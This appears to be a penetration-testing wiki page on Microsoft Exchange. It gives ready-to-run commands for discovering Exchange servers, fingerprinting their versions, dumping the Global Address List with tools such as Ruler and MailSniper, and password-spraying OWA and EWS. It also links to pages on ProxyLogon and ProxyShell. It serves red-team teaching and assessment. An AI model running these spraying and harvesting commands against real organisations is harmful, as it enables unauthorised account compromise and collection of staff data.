# Exchange services

## Theory

Microsoft Exchange Server is a [mail server](https://en.wikipedia.org/wiki/Mail_server) and [calendaring](https://en.wikipedia.org/wiki/Calendaring_software) server developed by [Microsoft](https://en.wikipedia.org/wiki/Microsoft). It runs exclusively on [Windows Server](https://en.wikipedia.org/wiki/Windows_Server) operating systems.

## Practice

### Enumeration

#### Discover Exchange Servers

{% tabs %}
{% tab title="UNIX-like" %}
We can use following commands to discover Exchange servers from a large scope of subdomains:

```bash
$ cat subdomains.txt
sub1.example.com
sub2.example.ru
sub3.example.bz

$ for i in `cat subdomains.txt | rev | cut -d. -f1-2 | rev | sort -u`; do echo https://autodiscover.$i; done | httpx -silent -random-agent -fr -t 20 -sc -title -td -ip | grep Outlook | grep -oP '\d+\.\d+\.\d+\.\d+' | dnsx -silent -re -ptr
1.3.3.7 [mx1.example.com]
66.66.66.66 [mx2.example.ru]
123.123.123.123 [mx3.example.bz]
```
{% endtab %}
{% endtabs %}

#### Enumerate Exchange Version

{% tabs %}
{% tab title="UNIX-like (from outside)" %}
We can use following commands to retreive the Exchange build number and correlate it with the [release dates](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates):

```bash
curl -sSL https://<TARGET>/owa/auth/logon.aspx -k| grep favicon.ico
# OR
curl https://<TARGET>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version
```
{% endtab %}

{% tab title="Windows (from inside)" %}
We can use following commands to retreive the Exchange build number and correlate it with the [release dates](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates):

```powershell
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

(curl -UseBasicParsing -MaximumRedirection 0 https://exch01).Headers."X-OWA-Version"
```
{% endtab %}
{% endtabs %}

#### User Enumeration (GAL)

If access to a domain-joined computer or a corporate email account is obtained, the Global Address List (GAL) can be exported, allowing a list of usernames to be retreived.

{% tabs %}
{% tab title="UNIX-like" %}
#### Ruler

[Ruler](https://github.com/sensepost/ruler) (Go) can be used to retreive the GAL using known credentials.

```bash
ruler -k -d target.domain -u user -p 'Passw0rd!' -e user@target.domain --verbose abk dump -o gal.txt
```

#### global-address-list-owa <a href="#mailsniper" id="mailsniper"></a>

[global-address-list-owa](https://github.com/pigeonburger/global-address-list-owa) (Python) can also be used to export the Gal using known credentials.

```bash
python3 emailextract.py -i exch01.target.domain -u user@target.domain -p 'P@ssword!'
```
{% endtab %}

{% tab title="Windows" %}
[MailSniper](https://github.com/dafthack/MailSniper) (Powershell) can be used to retreive the GAL from a domain-joined computer.

```powershell
Get-GlobalAddressList -ExchHostname mx.target.com -UserName TARGET\user -Password 'Passw0rd!' -OutFile gal.txt
```
{% endtab %}
{% endtabs %}

#### Vulnerabilities

{% content-ref url="privexchange.md" %}
[privexchange.md](privexchange.md)
{% endcontent-ref %}

{% content-ref url="proxylogon.md" %}
[proxylogon.md](proxylogon.md)
{% endcontent-ref %}

{% content-ref url="proxyshell.md" %}
[proxyshell.md](proxyshell.md)
{% endcontent-ref %}

{% content-ref url="proxynotshell.md" %}
[proxynotshell.md](proxynotshell.md)
{% endcontent-ref %}

### Password Spray

Password spray is an attack that involves using a single password against multiple accounts. This avoids account lockouts when multiple passwords are used on a single account. More details [on this page](../../../redteam/delivery/password-attacks.md).

{% tabs %}
{% tab title="UNIX-like" %}
[Ruler](https://github.com/sensepost/ruler) (Go) can be used to perform password spray attacks

```bash
ruler -k --domain target.domain brute --users global_address_list.txt --passwords passwords.txt --verbose -a 4
```
{% endtab %}

{% tab title="Windows" %}
Using [MailSniper](https://github.com/dafthack/MailSniper), we can perform a password spray with the functions `Invoke-PasswordSprayOWA` or `Invoke-PasswordSprayEWS`.

```powershell
Invoke-PasswordSprayOWA -ExchHostname exch01.domain.local -UserList .\usernames.txt -Password "P@ssword!" -OutFile creds.txt
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://ppn.snovvcra.sh/pentest/perimeter/exchange" %}
